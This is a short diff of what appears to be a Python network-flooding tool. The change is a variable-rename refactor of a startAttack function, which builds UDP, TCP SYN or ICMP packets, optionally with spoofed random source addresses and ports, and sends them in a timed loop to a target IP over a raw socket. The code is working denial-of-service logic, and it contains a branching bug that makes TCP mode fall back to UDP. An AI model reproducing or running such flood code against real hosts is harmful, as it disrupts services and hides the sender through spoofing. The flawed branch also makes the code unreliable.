@@ -42,25 +42,25 @@ def getPacket(getPacketFunc, random_source_ip, random_source_port, random_destin
     return getPacketFunc(srcIp=sIp, dstIp=destination_ip, srcPort=sP, dstPort=dP, data=getRandomData(data_length))
 
 
-def startAttack(type, duration, interval, random_source_ip, random_source_port, random_destination_port, source_ip,
+def startAttack(type_attack, duration, interval, random_source_ip, random_source_port, random_destination_port, source_ip,
                 source_port, destination_ip, destination_port, data_length):
     usedRandom = random_source_ip or random_source_port or random_destination_port
     sock = getSocket()
     # getPacketFunc = funcs[type]
-    if type == AttackType.UDP:
+    if type_attack == AttackType.UDP:
         getPacketFunc = getUdpPacket
-    if type == AttackType.TCP:
+    if type_attack == AttackType.TCP:
         getPacketFunc = getTcpSynPacket
-    if type == AttackType.ICMP:
+    if type_attack == AttackType.ICMP:
         getPacketFunc = getIcmpPacket
     else:
         getPacketFunc = getUdpPacket
     packet = getPacket(getPacketFunc, random_source_ip, random_source_port, random_destination_port, source_ip,
                        source_port, destination_ip, destination_port, data_length)
     amount = duration
-    endTime = time() + amount
+    endtime = time() + amount
     counter = 0
-    while time() < endTime:
+    while time() < endtime:
         sock.sendto(packet, (destination_ip, 0 ))
         counter += 1
         sleep(interval)
